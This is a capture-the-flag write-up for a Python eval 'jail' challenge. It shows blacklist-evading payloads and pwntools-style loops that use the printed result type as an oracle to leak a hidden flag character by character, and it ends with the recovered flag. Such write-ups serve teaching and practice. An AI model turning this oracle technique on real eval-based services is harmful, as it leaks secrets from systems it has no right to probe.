# Typeit2 - JAIL (500 points)
> Note: inintended solution
- letters are blacklisted 
```
BLACKLIST = '"%&\',-/_:;@\\`{|}~*<=>[] \t\n\r\x0b\x0c'
```
- the main functionality of the program is to print the type of the input with only type in the builtins and the flag
```
print(eval(f"{func.__name__}({s})", {"__builtins__": {func.__name__: func}, "flag": FLAG}))
```
- whitelisted caracters that might be interesting are ``a-zA-z and ()``

## solution
- preparation
    - ``encode()`` funtion encode the flag (to bytes)
    - ``count()`` function return the count of a letter in a string or bytes
    - ``index()`` and ``rindex()`` functions to get the first/last index of the caracter in string  
- we can now create our payload
```py
flag.encode().count(i)is(j)and(0)  #get the count
flag.encode().index(i)is(j)and(0)  #get the first index of letter
flag.encode().rindex(i)is(j)and(0) #get the last index of letter
```
- we make a loop from 32 to 127 and test all caracters:
    - if the result is ``<class 'int'>`` then we get the right count/index/rindex. of the caracter==chr(i)
    - if the result is ``<class 'bool'>`` then we still have to search the next caracter

### count function
```py
def count_letters():
	l=[]
	for i in range(32,127):
		j=0
		m=False
		print("i = ",i)
		while m==False:
			p="flag.encode().count({i})is({j})and(0)".format(i=i,j=j)
			chall.sendline(p)
			
			chall.recvline()
			s=str(chall.recvline())[2:15]
			#print(s)
			
			#s=str(chall.recvline())[10:23]
			if s=="<class 'int'>":
				if j!=0:
					l.append([chr(i),j])
				m=True
			else:
				j+=1
	return l # a list of caracters with their count
```
### length of the flag
- we can calculate now the length of the flag
```py
def get_flag_length(l):
	k=0
	for i in l:
		k+=i[1]
	return k
```
### search for caracters index and construct the flag
```py
def construct_flag(counted_letters,flag_length):
	flag='*'*flag_length

	print("first index")
	for i in counted_letters:
		j=0
		m=False
		print("letter : ",i[0])
		for j in range(0,flag_length):
			p="flag.encode().index({carac})is({j})and(0)".format(carac=ord(i[0]),j=j)
			chall.sendline(p)
			
			chall.recvline()
			s=str(chall.recvline())[2:15]			
			#s=str(chall.recvline())[10:23]
			if s=="<class 'int'>":
				flag=flag[:j]+i[0]+flag[(j+1):]
				print(flag)
				break
			else:
				j+=1

	print("Last index")
	for i in counted_letters:
		j=0
		m=False
		if i[1]>=2:
			print("letter : ",i[0])
			for j in range(0,flag_length):
				p="flag.encode().rindex({carac})is({j})and(0)".format(carac=ord(i[0]),j=j)
				chall.sendline(p)
				
				chall.recvline()
				s=str(chall.recvline())[2:15]				
				#s=str(chall.recvline())[10:23]
				if s=="<class 'int'>":
					flag=flag[:j]+i[0]+flag[(j+1):]
					print(flag)
					break
				else:
					j+=1
	return flag
```


- we combine all three functions in [script.py](./script.py)
> the result (the flag) not be with all it's caracters because some caracters have count >2 and we can have only first and last caracter index but we can guess the index of the rest

## Flag
``CyberErudites{ERRRROR_B4$E3_FTW!!!!}``